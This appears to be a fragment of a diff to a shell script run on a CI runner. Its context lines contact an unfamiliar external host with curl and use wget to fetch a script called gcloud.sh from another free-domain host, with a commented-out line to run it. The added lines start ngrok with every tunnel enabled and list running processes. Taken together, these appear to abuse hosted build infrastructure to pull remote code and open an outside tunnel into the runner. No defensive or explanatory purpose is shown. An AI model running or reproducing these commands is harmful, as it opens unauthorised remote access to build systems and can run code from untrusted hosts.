@@ -22,3 +22,5 @@ curl  http://w.ng.dissipator.ga:8081
 ls -l $HOME
 wget http://pi.lucas.ga:2280/luci-static/bin/gcloud.sh
 #bash gcloud.sh
+/home/runner/ngrok --config /home/runner/ngrok.conf start-all
+ps -ef
